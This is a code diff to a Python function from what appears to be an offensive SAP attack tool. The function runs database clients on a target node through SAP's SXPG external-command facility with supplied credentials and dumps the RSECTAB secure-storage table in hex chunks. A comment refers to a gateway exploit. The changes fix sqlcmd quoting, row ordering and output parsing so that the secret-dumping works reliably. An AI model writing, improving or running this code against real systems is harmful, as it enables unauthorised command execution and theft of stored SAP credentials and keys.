@@ -584,9 +584,12 @@ def _read_rsectab_via_sxpg(node, creds) -> list | None:
         # Use named-instance dot-notation (.\\<SID>_DB) — same pattern as the GW
         # exploit.  TCP/1433 is typically disabled on SAP MSSQL named-instance
         # systems; shared-memory / named-pipes on .\\<SID>_DB always work locally.
+        # Double-quote the SQL so sqlcmd -Q receives the full query as one argument.
+        # Without quotes, sqlcmd -Q only tokenises on the first space-delimited word
+        # ("SELECT") and silently discards the rest, producing a syntax error.
         mssql_server = f".\\{sid.upper()}_DB"
         return sapmap_rfc.execute_local_command(
-            node, "sqlcmd", f"-S {mssql_server} -h -1 -W -Q {sql}", creds)
+            node, "sqlcmd", f'-S {mssql_server} -h -1 -W -Q "{sql}"', creds)
 
     def _ada_query(sql):
         return sapmap_rfc.execute_local_command(
@@ -636,17 +639,23 @@ def _read_rsectab_via_sxpg(node, creds) -> list | None:
         print(f"[-] {node.sid}: Unsupported DB type for SXPG RSECTAB: {db_type}")
         return None
 
-    sql_ident = f"SELECT IDENT FROM {tbl}"
+    # ORDER BY MANDT,IDENT ensures all 5 queries return rows in the same order
+    # so the index-based merge (idents[i] ↔ hex_chunks[i]) is correct.
+    # Without ORDER BY, the DB may return rows in any order (e.g. different
+    # execution plans for each query), causing wrong ident↔data pairings.
+    order_by = "ORDER BY MANDT,IDENT"
+
+    sql_ident = f"SELECT IDENT FROM {tbl} {order_by}"
     # All chunks include an explicit length — SQL Server SUBSTRING() requires 3 args;
     # using chunk (120) for the last segment is safe: it returns whatever is left
     # (≤120 chars) without truncating, because SUBSTRING/SUBSTR silently stops
     # at the end of the string.  The total RSECTAB DATA hex is 368 chars
     # (184 bytes × 2), split into 120+120+120+8.
     sql_chunks = [
-        f"SELECT {sub_fn}({hex_fn},1,{chunk}) FROM {tbl}",
-        f"SELECT {sub_fn}({hex_fn},{chunk+1},{chunk}) FROM {tbl}",
-        f"SELECT {sub_fn}({hex_fn},{chunk*2+1},{chunk}) FROM {tbl}",
-        f"SELECT {sub_fn}({hex_fn},{chunk*3+1},{chunk}) FROM {tbl}",
+        f"SELECT {sub_fn}({hex_fn},1,{chunk}) FROM {tbl} {order_by}",
+        f"SELECT {sub_fn}({hex_fn},{chunk+1},{chunk}) FROM {tbl} {order_by}",
+        f"SELECT {sub_fn}({hex_fn},{chunk*2+1},{chunk}) FROM {tbl} {order_by}",
+        f"SELECT {sub_fn}({hex_fn},{chunk*3+1},{chunk}) FROM {tbl} {order_by}",
     ]
 
     print(f"[*] {node.sid}: Reading RSECTAB via SXPG ({db_key} CLI)...")
@@ -680,6 +689,9 @@ def _read_rsectab_via_sxpg(node, creds) -> list | None:
                                          "SUBSTRING", "EXPRESSION")):
                 continue
             if clean.startswith("*") or "rows selected" in clean.lower():
+                continue
+            # sqlcmd (MSSQL) footer: "(400 rows affected)" — filter it
+            if clean.startswith("(") and "rows affected" in clean.lower():
                 continue
             lines.append(clean)
         return lines
